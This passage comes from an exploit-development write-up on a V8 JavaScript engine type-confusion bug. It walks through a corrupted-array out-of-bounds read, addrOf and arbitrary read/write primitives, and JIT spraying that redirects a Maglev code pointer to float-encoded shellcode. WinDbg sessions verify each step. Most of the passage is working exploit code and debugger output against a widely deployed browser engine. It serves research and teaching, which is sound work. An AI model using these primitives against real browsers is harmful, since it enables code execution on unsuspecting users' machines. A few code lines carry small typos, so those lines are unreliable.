 - map: 0x00f30018e299 &lt;Map[16](PACKED_SMI_ELEMENTS)&gt; [FastProperties]
 - prototype: 0x00f30018e4dd &lt;JSArray[0]&gt;
 - elements: 0x00f300000219 &lt;FixedArray[0]&gt; [PACKED_SMI_ELEMENTS]
 - length: 463348
 }
</code></pre><blockquote>
<p>Inspecting the Corrupted Array Length</p>
</blockquote>
<p>On the first run, the <em>corruptedArr</em> array has a length of 0, as
expected after triggering the vulnerable code. However, thanks to the
garbage collector shuffled memory, we can see that the new length is
of <em>463348</em>. This is a large value that might lead to object
corruption.</p>
<p>As with most JIT-based type confusion bug, the next exploitation step
involves getting an arbitrary controlled read/write primitive.</p>
<p>The idea behind the original exploit is that we can make use of the
the <em>corruptedArr</em> out-of-bound read to get the address of a marker
array, here named <em>oobDblArr</em>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">searchDblArrIndex</span><span class="p">(</span><span class="nx">startAddr</span><span class="p">,</span> <span class="nx">corruptedArr</span><span class="p">,</span> <span class="nx">marker1</span><span class="p">,</span> <span class="nx">marker2</span><span class="p">,</span> <span class="nx">limit</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kd">var</span> <span class="nx">startIndex</span> <span class="o">=</span> <span class="nx">getOffset</span><span class="p">(</span><span class="nx">startAddr</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kd">var</span> <span class="nx">end</span> <span class="o">=</span> <span class="nx">getOffset</span><span class="p">(</span><span class="nx">limit</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">idx</span> <span class="o">=</span> <span class="nx">startIndex</span><span class="p">;</span> <span class="nx">idx</span> <span class="o">&lt;</span> <span class="nx">end</span><span class="p">;</span> <span class="nx">idx</span> <span class="o">+=</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="nx">corruptedArr</span><span class="p">[</span><span class="nx">idx</span><span class="p">]</span> <span class="o">==</span> <span class="nx">marker1</span> <span class="o">&&</span> <span class="nx">corruptedArr</span><span class="p">[</span><span class="nx">idx</span> <span class="o">+</span> <span class="mi">2</span><span class="p">]</span> <span class="o">==</span> <span class="nx">marker2</span><span class="p">)</span> <span class="p">{</span><span class="nx">s</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">idx</span> <span class="o">-</span> <span class="mi">3</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">  <span class="kr">class</span> <span class="nx">A</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">  <span class="kd">var</span> <span class="nx">gcSize</span> <span class="o">=</span> <span class="mh">0x4fe00000</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">  <span class="kd">var</span> <span class="nx">arrAddr</span> <span class="o">=</span> <span class="mh">0x42191</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kd">var</span> <span class="nx">emptyAddr</span> <span class="o">=</span> <span class="mh">0x219</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">  <span class="kd">var</span> <span class="nx">view</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ArrayBuffer</span><span class="p">(</span><span class="mi">24</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="kd">var</span> <span class="nx">dblArr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Float64Array</span><span class="p">(</span><span class="nx">view</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="kd">var</span> <span class="nx">intView</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Uint32Array</span><span class="p">(</span><span class="nx">view</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">  <span class="kd">var</span> <span class="nx">x</span> <span class="o">=</span> <span class="nb">Array</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">  <span class="kr">class</span> <span class="nx">B</span> <span class="kr">extends</span> <span class="nx">A</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">constructor</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">x</span> <span class="o">=</span> <span class="k">new</span><span class="p">.</span><span class="nx">target</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="kr">super</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">  <span class="kd">function</span> <span class="nx">construct</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kd">var</span> <span class="nx">r</span> <span class="o">=</span> <span class="nx">Reflect</span><span class="p">.</span><span class="nx">construct</span><span class="p">(</span><span class="nx">B</span><span class="p">,</span> <span class="p">[],</span> <span class="nx">x</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">r</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">2000</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="nx">construct</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">  <span class="k">new</span> <span class="nx">ArrayBuffer</span><span class="p">(</span><span class="nx">gcSize</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">new</span> <span class="nx">ArrayBuffer</span><span class="p">(</span><span class="nx">gcSize</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">  <span class="kd">var</span> <span class="nx">corruptedArr</span> <span class="o">=</span> <span class="nx">construct</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="nx">corruptedArr</span> <span class="o">=</span> <span class="nx">construct</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">  <span class="kd">function</span> <span class="nx">getOffset</span><span class="p">(</span><span class="nx">addr</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">(</span><span class="nx">addr</span> <span class="o">-</span> <span class="nx">emptyAddr</span><span class="p">)</span> <span class="o">/</span> <span class="mi">4</span> <span class="o">-</span> <span class="mi">2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">  <span class="kd">var</span> <span class="nx">oobDblArr</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0x51</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mf">1.5</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">  <span class="kd">var</span> <span class="nx">dblIndex</span> <span class="o">=</span> <span class="nx">searchDblArrIndex</span><span class="p">(</span><span class="nx">arrAddr</span><span class="p">,</span> <span class="nx">corruptedArr</span><span class="p">,</span> <span class="mh">0x40504000</span> <span class="o">/</span> <span class="mi">2</span><span class="p">,</span> <span class="mh">0x40508000</span> <span class="o">/</span> <span class="mi">2</span><span class="p">,</span> <span class="nx">arrAddr</span> <span class="o">+</span> <span class="mh">0x1000</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="o">%</span><span class="nx">DebugPrint</span><span class="p">(</span><span class="nx">corruptedArr</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="o">%</span><span class="nx">DebugPrint</span><span class="p">(</span><span class="nx">oobDblArr</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nb">Math</span><span class="p">.</span><span class="nx">sin</span><span class="p">();</span>
</span></span></code></pre></div><blockquote>
<p>1.js - Finding the OobDblArr Array via CorruptedArr OOB Read</p>
</blockquote>
<p>Here the <em>oobDblArr</em> array is used as a marker, that creates <em>0x40504000</em> and <em>0x40508000</em> values in memory.</p>
<p>The <em>searchDblArrIndex</em> function parses the first <em>corruptedArr</em>
corrupted array in search for those two signatures that belongs to
<em>oobDblArr</em>.</p>
<p>We can verify this piece of information with WinDbg by launching d8 from it, with similar options.</p>
<p><img src="../../../../img/v8/windbg0.png">
<em>Launching 1.js from WinDbg</em></p>
<p>We then enable a breakpoint at the <em>d8!Builtins_MathSin</em> function and
then let the code resume execution.</p>
<pre tabindex="0"><code>0:000&gt; bp d8!Builtins_MathSin
breakpoint 0 redefined
0:000&gt; g
...
Breakpoint 0 hit
d8!Builtins_MathSin:
00007ff6`32560140 55              push    rbp
</code></pre><blockquote>
<p>Hitting the MathSin Breakpoint</p>
</blockquote>
<p>From the console window we take note of the <em>elements</em> address of the
<em>corruptedArr</em>, that is <em>0000019E00042159</em> in this case.</p>
<pre tabindex="0"><code>DebugPrint: 0000019E00042159: [JSArray]
 - map: 0x019e0018e299 &lt;Map[16](PACKED_SMI_ELEMENTS)&gt; [FastProperties]
 - prototype: 0x019e0018e4dd &lt;JSArray[0]&gt;
 - elements: 0x019e00000219 &lt;FixedArray[0]&gt; [PACKED_SMI_ELEMENTS]
</code></pre><blockquote>
<p>Inspecting corruptedArr Elements Address</p>
</blockquote>
<p>We should keep in mind that, as pointed out by Man Yue Mo, due to V8
heap <del>lack of</del> randomization, most objects will be aligned at static
offsets from the original corrupted one.</p>
<p>We can now search the <em>40 50 40 00</em> pattern by starting from
<em>0x019e00000219</em> until the provided length of <em>0x42191</em> plus 0x1000.</p>
<pre tabindex="0"><code>0:000&gt; s 0x019e00000219 L?0x42191+1000 40 50 40 00
0000019e`00042175  40 50 40 00 00 00 00 00-80 50 40 00 00 00 00 00  @P@......P@.....
0000019e`000421bd  40 50 40 00 00 00 00 00-80 50 40 00 00 00 00 00  @P@......P@.....
</code></pre><blockquote>
<p>Manually Searching for the oobDblArr Markers</p>
</blockquote>
<p>With the correct object aligned in the final version of the exploit,
the function will grab only the second hit, which is the one pointing
to the <em>oobDblArr</em> elements object.</p>
<p>From here our strategy goes pretty much similar to other
type confusion bugs: another object, <em>oobObjArr</em> is placed after
<em>oobDblArr</em>.</p>
<p>Using our out-of-bounds (OOB) read operation on <em>oobDblArr</em>, we can
read the memory addresses of the objects stored in <em>oobObjArr</em>, which
allows us to obtain the address of any V8 object.</p>
<p>Next, we place another double array, <em>oobDblArr2</em>, right after
<em>oobDblArr</em>. By using the OOB write capability on <em>oobDblArr</em>, we
overwrite the element field of <em>oobDblArr2</em> to an object address.
Accessing the elements of <em>oobDblArr2</em> then enables us to read and
write to arbitrary addresses.</p>
<p>The <em>addrOf</em> operation, that gets a JS object pointer are accomplished
via the following code, along with the <em>read</em> and <em>write</em> primitives.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">oobDblArr</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0x51</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mf">1.5</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">oobDblArr2</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mf">1.5</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">oobObjArr</span> <span class="o">=</span> <span class="p">[</span><span class="nx">view</span><span class="p">,</span> <span class="mh">0x424242</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="nx">oobObjArr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x414141</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">addrOf</span><span class="p">(</span><span class="nx">obj</span><span class="p">,</span> <span class="nx">dblOffset</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">oobObjArr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">obj</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kd">var</span> <span class="nx">addrDbl</span> <span class="o">=</span> <span class="nx">oobDblArr</span><span class="p">[</span><span class="nx">dblOffset</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nx">ftoi32</span><span class="p">(</span><span class="nx">addrDbl</span><span class="p">)[</span><span class="mi">0</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">read</span><span class="p">(</span><span class="nx">addr</span><span class="p">,</span> <span class="nx">dblArrOffset</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kd">var</span> <span class="nx">oldValue</span> <span class="o">=</span> <span class="nx">oobDblArr</span><span class="p">[</span><span class="nx">dblArrOffset</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">  <span class="nx">oobDblArr</span><span class="p">[</span><span class="nx">dblArrOffset</span><span class="p">]</span> <span class="o">=</span> <span class="nx">i32tof</span><span class="p">(</span><span class="nx">addr</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="kd">var</span> <span class="nx">out</span> <span class="o">=</span> <span class="nx">ftoi32</span><span class="p">(</span><span class="nx">oobDblArr2</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">  <span class="nx">oobDblArr</span><span class="p">[</span><span class="nx">dblArrOffset</span><span class="p">]</span> <span class="o">=</span> <span class="nx">oldValue</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nx">out</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">write</span><span class="p">(</span><span class="nx">addr</span><span class="p">,</span> <span class="nx">val1</span><span class="p">,</span> <span class="nx">val2</span><span class="p">,</span> <span class="nx">dblArrOffset</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kd">var</span> <span class="nx">oldValue</span> <span class="o">=</span> <span class="nx">oobDblArr</span><span class="p">[</span><span class="nx">dblArrOffset</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">  <span class="nx">oobDblArr</span><span class="p">[</span><span class="nx">dblArrOffset</span><span class="p">]</span> <span class="o">=</span> <span class="nx">i32tof</span><span class="p">(</span><span class="nx">addr</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nx">oobDblArr2</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">i32tof</span><span class="p">(</span><span class="nx">val1</span><span class="p">,</span> <span class="nx">val2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nx">oobDblArr</span><span class="p">[</span><span class="nx">dblArrOffset</span><span class="p">]</span> <span class="o">=</span> <span class="nx">oldValue</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><blockquote>
<p>addrOf and r/w Function</p>
</blockquote>
<p>Until recent times, having such primitives would lead to the creation of
<a href="https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/">RWX pages</a>
through <a href="https://v8.dev/docs/wasm-compilation-pipeline">Web Assembly</a>
and this would be pretty much game-over for the renderer process.</p>
<p>However, the newly introduce <a href="https://docs.google.com/document/d/1FM4fQmIhEqPG8uGp5o9A-mnPB5BOeScZYpkHjo0KKA8/">V8 heap
sandbox</a>
mitigates the WASM technique by isolating the heap address space even
further and making external memory access harder.</p>
<p>In order to bypass the V8 heap sandbox we need to resort to a quite
recent technique named <a href="https://mem2019.github.io/jekyll/update/2022/02/06/DiceCTF-Memory-Hole.html">JIT
spraying</a>.</p>
<p>The idea is to abuse the function pointer located inside the <em>code</em>
object of a JITted function and hijack it to point to the start of our
shellcode instead.</p>
<p>JIT-spraying can be summarized with the following four steps:</p>
<ol>
<li>
<p>We store the shellcode as a double array (or other suitable data
structures) to store shellcode as floating-point numbers. More
about this step in the next section.</p>
</li>
<li>
<p>Use the arbitrary read primitive to find the JIT-optimized code
pointer in the JavaScript Function object.</p>
</li>
<li>
<p>Modify the JIT code pointer using the arbitrary write primitive to
point to the desired location in the JIT code, instead of the
original code flow.</p>
</li>
<li>
<p>Invoke the JITted shellcode function, which now points to the start
of our shellcode instead of its original start address.</p>
</li>
</ol>
<p>Let&rsquo;s illustrate the concept by picking the related JIT-spraying code
from our exploit.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="kd">function</span> <span class="nx">func</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">[</span><span class="mf">1.9711826951435894</span><span class="nx">e</span><span class="o">-</span><span class="mi">246</span><span class="p">,</span> <span class="mf">1.971182297804913</span><span class="nx">e</span><span class="o">-</span><span class="mi">246</span><span class="p">,</span> <span class="mf">1.9711823870029425</span><span class="nx">e</span><span class="o">-</span><span class="mi">246</span><span class="p">,</span> <span class="mf">1.971182489416965</span><span class="nx">e</span><span class="o">-</span><span class="mi">246</span><span class="p">,</span> <span class="mf">1.9485505705182829</span><span class="nx">e</span><span class="o">-</span><span class="mi">246</span><span class="p">,</span> <span class="mf">1.9711823520879356</span><span class="nx">e</span><span class="o">-</span><span class="mi">246</span><span class="p">,</span> <span class="mf">1.93080727203784</span><span class="nx">e</span><span class="o">-</span><span class="mi">246</span><span class="p">,</span> <span class="mf">1.971182897965126</span><span class="nx">e</span><span class="o">-</span><span class="mi">246</span><span class="p">,</span> <span class="mf">1.9560492656946336</span><span class="nx">e</span><span class="o">-</span><span class="mi">246</span><span class="p">,</span> <span class="mf">1.9711824228538599</span><span class="nx">e</span><span class="o">-</span><span class="mi">246</span><span class="p">,</span> <span class="mf">1.9895153914032175</span><span class="nx">e</span><span class="o">-</span><span class="mi">246</span><span class="p">,</span> <span class="mf">1.9711828988902342</span><span class="nx">e</span><span class="o">-</span><span class="mi">246</span><span class="p">,</span> <span class="mf">1.971182900238425</span><span class="nx">e</span><span class="o">-</span><span class="mi">246</span><span class="p">,</span> <span class="o">-</span><span class="mf">6.828932338446045</span><span class="nx">e</span><span class="o">-</span><span class="mi">229</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">    <span class="kd">var</span> <span class="nx">funcAddr</span> <span class="o">=</span> <span class="nx">addrOf</span><span class="p">(</span><span class="nx">func</span><span class="p">,</span> <span class="p">(</span><span class="nx">objIndex</span> <span class="o">-</span> <span class="nx">oobDblIndex</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="o">%</span><span class="nx">DebugPrint</span><span class="p">(</span><span class="nx">func</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;func Addr: &#34;</span> <span class="o">+</span> <span class="nx">funcAddr</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="kd">var</span> <span class="nx">dblOffset</span> <span class="o">=</span> <span class="p">(</span><span class="nx">oobDbl2Index</span> <span class="o">-</span> <span class="nx">oobDblIndex</span> <span class="o">-</span> <span class="mi">5</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kd">var</span> <span class="nx">codeAddr</span> <span class="o">=</span> <span class="nx">read</span><span class="p">(</span><span class="nx">funcAddr</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">,</span> <span class="nx">dblOffset</span><span class="p">)[</span><span class="mi">0</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;code Addr: &#34;</span> <span class="o">+</span> <span class="nx">codeAddr</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="kd">var</span> <span class="nx">maglevAddr</span> <span class="o">=</span> <span class="nx">read</span><span class="p">(</span><span class="nx">codeAddr</span> <span class="o">+</span> <span class="mh">0x8</span><span class="p">,</span> <span class="nx">dblOffset</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;maglev Addr: &#34;</span> <span class="o">+</span> <span class="nx">maglevAddr</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span> <span class="o">+</span><span class="nx">maglevAddr</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34; &#34;</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nb">Math</span><span class="p">.</span><span class="nx">sin</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="nx">write</span><span class="p">(</span><span class="nx">codeAddr</span> <span class="o">+</span> <span class="mh">0x8</span><span class="p">,</span> <span class="nx">maglevAddr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x80</span> <span class="o">+</span> <span class="mi">2</span><span class="p">,</span> <span class="nx">maglevAddr</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nx">dblOffset</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="o">%</span><span class="nx">DebugPrint</span><span class="p">(</span><span class="nx">func</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nb">Math</span><span class="p">.</span><span class="nx">sin</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="nx">func</span><span class="p">();</span>
</span></span></code></pre></div><blockquote>
<p>JIT-spraying Exploit Code</p>
</blockquote>
<p>Here the code retrieve the <em>func</em> address via the <em>addrOf</em> primitives and then by dereferencing static offsets, it gets the <em>code</em>  pointer.</p>
<p>Let&rsquo;s DebugPrint the <em>func</em> object before any modification.</p>
<pre tabindex="0"><code>DebugPrint: 000001F10019B705: [Function] in OldSpace
 - map: 0x01f100184131 &lt;Map[32](HOLEY_ELEMENTS)&gt; [FastProperties]
 - prototype: 0x01f100184059 &lt;JSFunction (sfi = 000001F100146745)&gt;
 - elements: 0x01f100000219 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]
 - function prototype:
 - initial_map:
 - shared_info: 0x01f10019aad9 &lt;SharedFunctionInfo func&gt;
 - name: 0x01f10019a695 &lt;String[4]: #func&gt;
 - formal_parameter_count: 0
 - kind: NormalFunction
 - context: 0x01f10019b595 &lt;ScriptContext[5]&gt;
 - code: 0x01f1001a2741 &lt;Code MAGLEV&gt;
</code></pre><blockquote>
<p>Printing <em>func</em> properties</p>
</blockquote>
<p>Inspecting the Code MAGLEV object at <em>0x01f1001a2741</em> reveals the
following details.</p>
<pre tabindex="0"><code>0:000&gt; dq 0x01f1001a2741-1 L4
000001f1`001a2740  001a26a9`00000d91 9248d9b1`00000f61
000001f1`001a2750  00007ff6`9248d9c0 000003ac`000000ac
</code></pre><blockquote>
<p>Inspecting the Code Object Pointers</p>
</blockquote>
<p>At offset 0x10, we can observe <em>00007ff69248d9c0</em>, which is the
JIT-compiled code from the function <em>func</em>. Let&rsquo;s disassemble it and
verify its page permission.</p>
<pre tabindex="0"><code>0:000&gt; u 7ff69248d9c0
00007ff6`9248d9c0 8b59f4          mov     ebx,dword ptr [rcx-0Ch]
00007ff6`9248d9c3 4903de          add     rbx,r14
00007ff6`9248d9c6 f7431700000020  test    dword ptr [rbx+17h],20000000h
00007ff6`9248d9cd 0f856d3afe9f    jne     d8!Builtins_CompileLazyDeoptimizedCode (00007ff6`32471440)
00007ff6`9248d9d3 49b9b9ba1900f1010000 mov r9,1F10019BAB9h
00007ff6`9248d9dd 410fb7490d      movzx   ecx,word ptr [r9+0Dh]
00007ff6`9248d9e2 f6c12e          test    cl,2Eh
00007ff6`9248d9e5 0f85e1010000    jne     00007ff6`9248dbcc
0:000&gt; !address 7ff69248d9c0
...
Protect:                00000040          PAGE_EXECUTE_READWRITE
...
</code></pre><blockquote>
<p>Inspecting the JIT Code and Memory Permissions</p>
</blockquote>
<p>We have cnfirmed that the page is executable and so we can resume execution.</p>
<pre tabindex="0"><code>0:000&gt; g
Breakpoint 0 hit
d8!Builtins_MathSin:
00007ff6`32560140 55              push    rbp
0:000&gt; dq 0x01f1001a2741-1 L4
000001f1`001a2740  001a26a9`00000d91 9e248d9b1`00000f61
000001f1`001a2750  00007ff6`9248da42 000003ac`000000ac
0:000&gt; u 00007ff6`9248da42
00007ff6`9248da42 0349ba          add     ecx,dword ptr [rcx-46h]
00007ff6`9248da45 4883c360        add     rbx,60h
00007ff6`9248da49 90              nop
00007ff6`9248da4a 90              nop
00007ff6`9248da4b eb0c            jmp     00007ff6`9248da59
00007ff6`9248da4d c4c1f96ec2      vmovq   xmm0,r10
00007ff6`9248da52 c5fb114707      vmovsd  qword ptr [rdi+7],xmm0
00007ff6`9248da57 49ba654c8b039090eb0c mov r10,0CEB9090038B4C65h
</code></pre><blockquote>
<p>Verifying That the JIT Function Pointers Is Now Referencing Our Shellcode</p>
</blockquote>
<p>Once we hit the last breakpoint, we can analyze once more that the
pointer has changed to <em>00007ff69248da42</em>, thus leading to a different
JIT code chunk.</p>
<p>And you might have guessed right, that&rsquo;s our shellcode! We are going
to analyze it further in the next section. Now it&rsquo;s just a matter of
invoking the function, and the code will be redirected to our
controlled one.</p>
<p>We haven&rsquo;t yet explored how these floating-point numbers are able to
chain together a proper shellcode logic, so let&rsquo;s cover this last bit
in the next section.</p>
<h2 id="jit-spraying-shellcode">JIT-Spraying Shellcode</h2>
<p>While the JavaScript exploit detailed in the original blog post by
Man Yue Mo is fully portable, the shellcode itself is limited to Linux
systems.</p>
<p>As a first step, we want to figure out the mechanisms behdind the
existing payload and then adjust it so it can run on Windows systems.</p>
<p>As discussed earlier, the newly implemented V8 heap sandbox, with
its restrictive memory isolation, blocks the traditional method of
writing Web Assembly RWX pages. As a consequence, we need to find an
alternative approach to deliver and execute our payload.</p>
<p>The solution lies in <em>JIT
Spraying</em> <a href="https://en.wikipedia.org/wiki/IEEE_754">IEEE Immediate
Numbers</a>.</p>
<p>With JIT spraying, we JIT-compile our IEEE floating-point function
into the desired shellcode that we previously generated via a Python
script (more on that later). Then, by manipulating the function
pointer through read and write operations, we divert the execution to
the middle of the JIT code.</p>
<p>This technique will enable us to have floating-point data as
javascript code that will be converted into the desired assembly code
when JIT compiled.</p>
<p>To get a feeling about how the shellcode will look like in
memory, let&rsquo;s start with the following code snippet.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">shellcode</span> <span class="o">=</span> <span class="p">()</span> <span class="p">=&gt;{</span><span class="k">return</span> <span class="p">[</span><span class="mf">1.1</span><span class="p">,</span> <span class="mf">2.2</span><span class="p">,</span> <span class="mf">3.3</span><span class="p">];}</span>
</span></span><span class="line"><span class="cl"><span class="o">%</span><span class="nx">PrepareFunctionForOptimization</span><span class="p">(</span><span class="nx">shellcode</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">shellcode</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="o">%</span><span class="nx">OptimizeFunctionOnNextCall</span><span class="p">(</span><span class="nx">shellcode</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">shellcode</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="o">%</span><span class="nx">DebugPrint</span><span class="p">(</span><span class="nx">shellcode</span><span class="p">);</span>
</span></span></code></pre></div><blockquote>
<p>Testing IEEE Numbers within d8 Debugging Engine</p>
</blockquote>
<p>The first line is the actual payload function named <em>shellcode</em> that
takes no argument and returns an array containing three floating-point
numbers: 1.1, 2.2, and 3.3. Next, we prepare the the function for
JIT optimization via <em>%PrepareFunctionForOptimization</em>.
It is an internal function used by the V8 engine to prepare
JavaScript functions for optimization, which involves tasks such as
profiling, analysis, and setting up optimization-related mechanisms.</p>
